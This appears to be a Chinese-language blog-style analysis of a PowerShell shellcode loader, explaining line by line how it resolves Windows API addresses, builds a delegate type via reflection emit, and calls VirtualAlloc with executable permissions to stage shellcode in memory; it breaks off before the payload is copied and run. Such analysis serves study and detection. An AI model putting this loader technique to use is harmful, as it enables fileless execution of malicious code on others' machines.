func_get_proc_address

在这个函数中使用GetMethod方法从 system.dll访问 UnsafeNativeMethods

此处引入了GetModuleHandle和GetProcAddress。

GetModuleHandle：检索指定模块的模块句柄。模块必须已被调用进程加载。

GetProcAddress:从指定的动态链接库 (DLL) 中检索导出函数或变量的地址。

 

那么这个函数我们可以理解为获取给定方法的地址。以便在下一步在内存中为 shell 代码分配空间。


func_get_delegate_type

第一部分：获取参数

Param (    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,    [Parameter(Position = 1)] [Type] $var_return_type = [Void])

第一个参数是这个方法需要获取的参数类型

第二个参数是返回值类型

 

第二部分：定义一个动态程序集，为其定义模块，然后定义一个类型

$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

此处可分解为

[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

和

.DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

第一块儿

DefineDynamicAssembly方法有两个参数

  • AssemblyName：程序集的名称

  • AssemblyBuilderAccess：程序集的访问权限。

    • Run: 1 - 可以执行动态程序集，但不能保存。

    • RunAndCollect: 9 - 动态程序集将在不再可访问时自动卸载并回收其内存。

 

在这里ReflectedDelegate是名称，run是访问权限。此处名称可以是任意值。

 

第二块儿

DefineDynamicModule为程序集定义一个模块

   InMemoryModule为定义的模块名称

DefineType然后定义一个类型，

   MyDelegateType为定义的类型名称

 

第三部分：创建构造函数

$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters)

使用DefineConstructor方法创建构造函数，此方法有三个参数

  • MethodAttributes：构造函数的属性

    • RTSpecialName：表示公共语言运行时检查名称编码。

    • HideBySig：表示方法按名称和签名隐藏；否则，仅通过名称。

    • Public：表示该方法可被此对象在其范围内的任何对象访问。

  • CallingConventions：构造函数的调用约定。

    • 指定由公共语言运行时确定的默认调用约定。

  • Type[]：构造函数的参数类型。

 

第四部分：向类型添加一个新方法，具有指定的名称、方法属性、调用约定、方法签名和自定义修饰符

$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

使用DefineMethod定义一个方法

  • Invoke：方法名称

  • Attributes：方法属性

  • returnType：返回类型，此处由第一部分获取

  • parameterTypes：参数类型，此处由第一部分获取

 

使用SetImplementationFlags设置实现标志

  • Runtime：指定方法实现由运行时提供。

  • Managed：指定方法在托管代码中实现。

执行Shellcode

这里有个概念是Delegate，微软官方的解释是一个Delegate是代表与特定参数列表和返回类型的方法的引用类型。当您实例化委托时，您可以将其实例与具有兼容签名和返回类型的任何方法相关联。您可以通过委托实例调用（或调用）该方法。

 

第一部分：将非托管函数指针转换为委托，并调用它

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)

使用GetDelegateForFunctionPointer为函数指针获取一个委托。

  • 第一个参数为要转换的非托管函数指针。此处为func_get_proc_address函数获取的VirtualAlloc函数地址

  • 第二个参数为要返回的委托的类型。此处为func_get_delegate_type函数动态创建的程序集

此处功能完成后，VirtualAlloc实现了一个委托，并且可以在下一行使用invoke调用它
